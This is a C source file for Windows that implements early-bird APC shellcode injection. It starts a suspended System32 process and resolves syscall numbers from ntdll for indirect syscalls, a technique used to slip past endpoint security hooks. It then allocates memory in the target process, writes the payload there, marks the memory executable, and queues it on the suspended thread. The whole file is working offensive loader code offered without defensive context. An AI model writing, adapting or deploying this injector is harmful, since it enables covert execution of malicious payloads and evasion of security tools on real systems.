#include "APC.h"

#pragma warning (disable:4996)


BOOL CreateSuspendedProcess
(
	IN LPCSTR ProcessName,
	OUT DWORD* PID,
	OUT HANDLE* hProcess,
	OUT HANDLE* hThread
)

{

	BOOL State = TRUE;

	WCHAR lpPath[MAX_PATH * 2] = { 0 };
	CHAR WnDr[MAX_PATH] = { 0 };

	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	RtlSecureZeroMemory(&si, sizeof(STARTUPINFO));
	RtlSecureZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

	if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH))
	{
		WARN("GetEnvironmentVariableA Failed! With an Error: %d", GetLastError());
		return FALSE;
	}


	sprintf(lpPath, "%s\\System32\\%s", WnDr, ProcessName);


	si.cb = sizeof(STARTUPINFO);

	if (!CreateProcessA(NULL, lpPath, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
	{
		WARN("CreateProcessA Failed! With an Error: %lu", GetLastError());
		State = FALSE;
	}

	OKAY("[0x%p] Created Process: %d", pi.hProcess, pi.dwProcessId);

	*PID = pi.dwProcessId;
	*hProcess = pi.hProcess;
	*hThread = pi.hThread;

	return TRUE;

}

VOID IndirectPrelude(IN HMODULE mod, IN LPCSTR FuncName, OUT DWORD* FuncSSN, OUT PUINT_PTR FuncSys)
{

	DWORD SyscallNumber = 0;

	UCHAR SyscallOpcodes[2] = { 0x0F, 0x05 };

	UINT_PTR NtFunctionAddress = 0;

	NtFunctionAddress = (UINT_PTR)GetProcAddress(mod, FuncName);
	if (NtFunctionAddress == 0)
	{
		WARN("GetProcAddress Failed! With an Error: %ld", GetLastError());
		return;
	}

	BYTE byte4 = ((PBYTE)NtFunctionAddress)[4];
	BYTE byte5 = ((PBYTE)NtFunctionAddress)[5];
	*FuncSSN = (byte5 << 8) | byte4;

	*FuncSys = NtFunctionAddress + 0x12;


	if (memcmp(SyscallOpcodes, (PVOID)*FuncSys, sizeof(SyscallOpcodes)) == 0) {
		INFO("[0x%p] [0x%p] [0x%0.3lx] -> %s", (PVOID)NtFunctionAddress, (PVOID)*FuncSys, *FuncSSN, FuncName);
		return;
	}

	else {
		WARN("expected syscall signature: \"0x0f05\" didn't match.");
		return;
	}

	// courtesy of Crr0ww for this function

}


BOOL ApcInject
(
	IN HANDLE hProcess,
	IN HANDLE hThread,
	IN BYTE* pShellcode,
	IN SIZE_T sShellSize
)

{

	NTSTATUS STATUS = NULL;
	BOOL State = TRUE;
	PVOID rBuffer = NULL;
	HANDLE NtdllHandle = NULL;
	SIZE_T sBytesWritten = NULL;
	DWORD dwOldProt = NULL;
	PUCHAR localBuf = NULL;
	SIZE_T origSize = sShellSize;
	SIZE_T regionSize = sShellSize;


	localBuf = (PUCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sShellSize);
	if (!localBuf) {
		WARN("HeapAlloc failed");
		return FALSE;
	}
	memcpy(localBuf, pShellcode, sShellSize);


	NtdllHandle = GetModuleHandleW(L"ntdll.dll");
	if (NULL == NtdllHandle) {
		WARN("GetModuleHandleW", GetLastError());
		return FALSE;
	}
	OKAY("[0x%p] got the address of NTDLL!", NtdllHandle);

	IndirectPrelude(NtdllHandle, "NtAllocateVirtualMemory", &fn_NtAllocateVirtualMemorySSN, &fn_NtAllocateVirtualMemorySyscall);
	IndirectPrelude(NtdllHandle, "NtWriteVirtualMemory", &fn_NtWriteVirtualMemorySSN, &fn_NtWriteVirtualMemorySyscall);
	IndirectPrelude(NtdllHandle, "NtProtectVirtualMemory", &fn_NtProtectVirtualMemorySSN, &fn_NtProtectVirtualMemorySyscall);
	IndirectPrelude(NtdllHandle, "NtQueueApcThread", &fn_NtQueueApcThreadSSN, &fn_NtQueueApcThreadSyscall);
	IndirectPrelude(NtdllHandle, "NtFreeVirtualMemory", &fn_NtFreeVirtualMemorySSN, &fn_NtFreeVirtualMemorySyscall);


	/*----------------------------------------------------------[Allocating Virtual Memory]------------------------------------------------------*/

	STATUS = NtAllocateVirtualMemory(hProcess, &rBuffer, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("NtAllocateVirtualMemory Failed! With an Error: 0x%0.8x", STATUS);
		HeapFree(GetProcessHeap(), 0, localBuf);
		return FALSE;
	}

	INFO("Allocated [%zu] Bytes to Virtual Memory!", sShellSize);

	/*-----------------------------------------------------------[Writing Virtual Memory]------------------------------------------------------------*/

	STATUS = NtWriteVirtualMemory(hProcess, rBuffer, localBuf, origSize, &sBytesWritten);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("NtWriteVirtualMemory Failed! With an Error: 0x%0.8x", STATUS);
		HeapFree(GetProcessHeap(), 0, localBuf);
		return FALSE;
	}


	OKAY("Wrote [%zu] Bytes to Virtual Memory", sShellSize);

	/*----------------------------------------------------------[Changing Protecting Permissions]-----------------------------------------------------*/

	STATUS = NtProtectVirtualMemory(hProcess, &rBuffer, &origSize, PAGE_EXECUTE_READ, &dwOldProt);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("NtProtectVirtualMemory Failed! With an Error: 0x%0.8x", STATUS);
		HeapFree(GetProcessHeap(), 0, localBuf);
		return FALSE;
	}

	INFO("Changed Allocation Protection from [RW] to [RX]");

	STATUS = NtQueueApcThread(hThread, (PPS_APC_ROUTINE)rBuffer, NULL, NULL, NULL);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("NtQueueApcThread Failed! With an Error: 0x%0.8x", STATUS);
		HeapFree(GetProcessHeap(), 0, localBuf);
		return FALSE;
	}

	OKAY("[ 0x%p ] Executed payload using NtQueueApcThread", rBuffer);

	return TRUE;

}